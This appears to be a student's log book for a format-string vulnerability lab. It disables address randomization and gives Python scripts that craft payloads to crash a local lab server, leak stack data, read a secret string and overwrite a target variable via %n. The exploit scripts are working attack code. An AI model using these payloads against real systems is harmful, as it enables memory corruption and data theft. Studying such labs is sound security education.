# Log Book 6

## Disable adress randomization

`sudo sysctl -w kernel.randomize_va_space=0`

## Server output

```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd840
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 6 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd768
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hello
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Crash server

```py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte string at offset 4
for i in range(0, N, 2):
  content[i:i+2] = ("%s").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

## Print first 4 bytes

```py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0xaabbccdd
content[0:4]  =  (number).to_bytes(4,byteorder='little')

n = 64
x = "%x"
for i in range(4, 4 + 2 * n, len(x)):
  content[i:i+len(x)] = (x).encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

## Secret message

Secret message: "A secret message"

```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

secret_addr  = 0x080b4008
content[0:4]  =  (secret_addr).to_bytes(4,byteorder='little')

# skip to first to input init
n = 64 - 1
x = "%x "
skip_b = 4
for i in range(skip_b, skip_b + len(x) * n, len(x)):
  content[i:i+len(x)] = (x).encode('latin-1')

s_offset = skip_b + len(x) * n
content[s_offset:s_offset+2] = ("%s").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

### Task 3

## Change target

```
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

target_addr  = 0x080e5068
content[0:4]  =  (target_addr).to_bytes(4,byteorder='little')

# skip to first to input init
n = 64 - 1
x = "%x "
skip_b = 4
for i in range(skip_b, skip_b + len(x) * n, len(x)):
  content[i:i+len(x)] = (x).encode('latin-1')

s_offset = skip_b + len(x) * n
content[s_offset:s_offset+2] = ("%n").encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

## Store 0x5000 on target

```
#!/usr/bin/python3
import sys
from math import floor

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

target_addr  = 0x080e5068
content[0:4]  =  (target_addr).to_bytes(4,byteorder='little')

# skip to first to input init
n_bytes_to_print = 0x5000
n = 64 - 1
x_size = int(floor(n_bytes_to_print/n))
x = "%0" + str(x_size) + "x"
skip_b = 4
for i in range(skip_b, skip_b + len(x) * n, len(x)):
  content[i:i+len(x)] = (x).encode('latin-1')

# write number of written bytes to var
s_offset = skip_b + len(x) * n
# need to subtract 4 because it will write 4 bytes for the string
remaining = (n_bytes_to_print - (x_size * n)) - 4
n_str = "0"*remaining + "%n"
content[s_offset:s_offset+len(n_str)] = (n_str).encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
